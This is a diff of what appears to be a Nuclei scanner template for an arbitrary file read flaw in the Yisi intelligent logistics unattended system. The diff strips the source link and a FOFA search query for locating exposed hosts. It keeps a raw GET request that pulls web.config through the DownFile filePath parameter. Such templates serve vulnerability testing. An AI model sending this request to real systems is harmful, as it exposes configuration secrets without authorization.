@@ -3,12 +3,8 @@ info:
   name: 易思智能物流无人值守系统DownFile任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/urf90xoaxhzmuk5i'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: urf90xoaxhzmuk5i
-    fofa: body="/api/SingleLogin"
 http:
 - raw:
   - 'GET /PublicInfoManage/Upload/DownFile?filePath=web.config HTTP/1.0
